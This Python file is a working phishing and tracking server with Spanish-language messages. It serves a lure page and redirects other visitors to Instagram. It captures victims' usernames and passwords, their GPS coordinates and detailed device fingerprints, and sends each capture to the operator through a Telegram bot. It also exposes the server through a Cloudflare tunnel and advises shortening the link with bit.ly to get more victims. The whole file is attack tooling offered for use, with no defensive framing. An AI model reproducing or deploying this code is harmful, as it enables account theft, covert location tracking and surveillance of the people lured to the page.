import json
import os
import requests
import subprocess
import threading
import time
import re
from datetime import datetime
from http.server import BaseHTTPRequestHandler, HTTPServer
from dotenv import load_dotenv

load_dotenv()

PORT = int(os.getenv("PORT", 9999))
DB_FILE = os.getenv("DB_FILE", "database.json")
TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")

if not os.path.exists(DB_FILE):
    with open(DB_FILE, 'w') as f: json.dump([], f)

def get_ip_info(ip):
    if ip == "127.0.0.1" or ip == "localhost": return "Localhost (Pruebas)"
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,city,isp,org,mobile,proxy", timeout=3)
        if r.status_code == 200:
            data = r.json()
            if data['status'] == 'success':
                tipo_con = "📱 Datos Móviles" if data.get('mobile') else "🏠 Wi-Fi/Fibra"
                return f"{data['country']}, {data['city']} | {data['isp']} ({tipo_con})"
    except:
        pass
    return "Desconocido (API Offline)"

def enviar_telegram(mensaje):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    payload = {"chat_id": TELEGRAM_CHAT_ID, "text": mensaje, "parse_mode": "Markdown"}
    try:
        requests.post(url, data=payload, timeout=5)
    except Exception as e:
        print(f"[-] Error de Telegram: {e}")

class MasterHandler(BaseHTTPRequestHandler):
    def _set_headers(self, code=200):
        self.send_response(code)
        self.send_header('Content-type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()

    def do_GET(self):
        if self.path == '/' or self.path == '/index.html':
            try:
                with open("index.html", "rb") as f:
                    self.send_response(200); self.send_header('Content-type', 'text/html'); self.end_headers()
                    self.wfile.write(f.read())
            except: self.send_response(404); self.end_headers()
        else:
            self.send_response(301); self.send_header('Location', 'https://www.instagram.com'); self.end_headers()

    def do_POST(self):
        if self.path == '/api/collect':
            length = int(self.headers['Content-Length'])
            raw_data = self.rfile.read(length)

            try:
                data = json.loads(raw_data.decode('utf-8'))
                
                client_ip = self.headers.get('CF-Connecting-IP')
                if not client_ip:
                    client_ip = self.headers.get('X-Forwarded-For', self.client_address[0])
                if ',' in client_ip:
                    client_ip = client_ip.split(',')[0].strip()

                ev_name = str(data.get('event', '')).upper()

                if 'hardware' in data:
                    ip_detail = get_ip_info(client_ip)
                    hw = data.get('hardware', {})
                    sw = data.get('software', {})
                    bat = data.get('estado', {}).get('bateria', {})

                    alerta_vpn = ""
                    if sw.get('timezone') and "Bogota" in sw.get('timezone') and "Colombia" not in ip_detail and "Localhost" not in ip_detail:
                        alerta_vpn = "\n⚠️ *POSIBLE USO DE VPN/PROXY*"

                    msg = (
                        f"📡 *REPORTE DE SENSORES*\n"
                        f"━━━━━━━━━━━━━━━━━━\n"
                        f"🗺 *Ubicación IP:* `{ip_detail}`{alerta_vpn}\n"
                        f"🔗 *IP:* `{client_ip}`\n"
                        f"🚶 *Actividad:* `{hw.get('sensor_movimiento')}`\n"
                        f"💡 *Luz:* `{hw.get('sensor_luz')}`\n"
                        f"🕵️ *Incógnito:* `{'SÍ' if hw.get('modo_incognito') else 'No'}`\n"
                        f"📱 *GPU:* `{hw.get('gpu_renderer')}`\n"
                        f"🧠 *CPU/RAM:* {hw.get('cpu_cores')} Cores | {hw.get('ram_gb')}GB\n"
                        f"🔋 *Batería:* {bat.get('level')} ({bat.get('status')})"
                    )
                    enviar_telegram(msg)

                elif "LOGIN" in ev_name or 'credentials' in data:
                    creds = data.get('credentials', data)
                    u = creds.get('user') or creds.get('usuario')
                    p = creds.get('pass') or creds.get('password')
                    intento = data.get('try_count', 1)
                    msg = (
                        f"🔓 *LOGIN CAPTURADO (Intento {intento})*\n"
                        f"━━━━━━━━━━━━━━━━━━\n"
                        f"👤 *Usuario:* `{u}`\n"
                        f"🔑 *Clave:* `{p}`\n"
                        f"📍 *IP:* `{client_ip}`"
                    )
                    enviar_telegram(msg)

                elif "GPS" in ev_name or 'coords' in data:
                    c = data.get('coords', data)
                    maps_link = f"https://www.google.com/maps?q={c['lat']},{c['lon']}"
                    msg = (
                        f"🎯 *UBICACIÓN GPS*\n"
                        f"━━━━━━━━━━━━━━━━━━\n"
                        f"🗺 [Ver en Google Maps]({maps_link})\n"
                        f"📏 *Precisión:* {c.get('accuracy', 'N/A')}m\n"
                        f"⛰ *Altitud:* {c.get('alt', 'N/A')}"
                    )
                    enviar_telegram(msg)

                data['server_ip_info'] = client_ip
                data['timestamp'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

                with open(DB_FILE, 'r+') as f:
                    db = json.load(f)
                    db.append(data)
                    f.seek(0)
                    json.dump(db, f, indent=4)
                    f.truncate()

                self._set_headers(200)
                self.wfile.write(b'{"status":"ok"}')

            except Exception as e:
                print(f"Error procesando POST: {e}")
                self._set_headers(400)

def iniciar_tunel():
    print("[*] Iniciando túnel de Cloudflare...")
    proc = subprocess.Popen(
        ['cloudflared', 'tunnel', '--url', f'http://127.0.0.1:{PORT}'],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True
    )

    for line in proc.stdout:
        if "trycloudflare.com" in line:
            url = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
            if url:
                print(f"\n🚀 URL PÚBLICA ACTIVA: {url.group(0)}")
                print(f"🔗 BITLY SUGERIDO: https://bit.ly/xxxx (Acórtalo para mayor éxito)\n")
                break

if __name__ == "__main__":
    threading.Thread(target=iniciar_tunel, daemon=True).start()
    print(f"[*] SERVIDOR ACTIVO EN PUERTO {PORT}")
    try:
        HTTPServer(('0.0.0.0', PORT), MasterHandler).serve_forever()
    except KeyboardInterrupt:
        print("\n[!] Apagando servidor y túnel...")

